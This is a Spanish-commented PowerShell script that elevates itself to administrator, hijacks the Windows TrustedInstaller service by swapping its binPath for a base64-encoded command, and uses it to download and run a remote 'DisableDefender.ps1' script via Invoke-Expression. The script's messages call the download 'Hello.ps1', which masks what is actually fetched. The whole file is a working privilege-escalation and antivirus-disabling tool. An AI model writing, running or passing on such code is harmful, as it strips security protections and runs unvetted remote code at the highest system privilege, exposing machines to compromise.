# Verificar si se ejecuta como administrador; si no, relanzar con privilegios elevados
If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
  Write-Host "No se ejecuta como administrador. Relanzando con privilegios elevados..."
  Start-Process PowerShell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
  Exit
}

# Definir la función Run-Trusted
function Run-Trusted([String]$command) {
  try {
    Write-Host "Deteniendo TrustedInstaller..."
    Stop-Service -Name TrustedInstaller -Force -ErrorAction Stop
    $service = Get-WmiObject -Class Win32_Service -Filter "Name='TrustedInstaller'" -ErrorAction Stop
    $DefaultBinPath = $service.PathName
    Write-Host "Codificando comando en Base64..."
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $base64Command = [Convert]::ToBase64String($bytes)
    Write-Host "Modificando binPath de TrustedInstaller..."
    sc.exe config TrustedInstaller binPath= "cmd.exe /c powershell.exe -encodedcommand $base64Command" | Out-Null
    Write-Host "Iniciando TrustedInstaller..."
    sc.exe start TrustedInstaller | Out-Null
    Start-Sleep -Seconds 2 # Esperar a que el comando se ejecute
    Write-Host "Restaurando binPath original..."
    sc.exe config TrustedInstaller binpath= "`"$DefaultBinPath`"" | Out-Null
    Stop-Service -Name TrustedInstaller -Force -ErrorAction Stop
  } catch {
    Write-Host "Error en Run-Trusted: $_"
  }
}

# Comando para descargar y ejecutar Hello.ps1
$executeCommand = @"
try {
  Write-Host 'Descargando Hello.ps1...'
  \$scriptContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/zoicware/DefenderProTools/main/DisableDefender.ps1' -UseBasicParsing -ErrorAction Stop
  Write-Host 'Ejecutando Hello.ps1...'
  Invoke-Expression \$scriptContent.Content
} catch {
  Write-Host 'Error al descargar o ejecutar Hello.ps1: \$_'
}
"@

# Ejecutar el comando con Run-Trusted
Write-Host 'Iniciando descarga y ejecución de Hello.ps1...'
Run-Trusted -command $executeCommand
Write-Host 'Ejecución completada!'

#usar powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\Mio.ps1
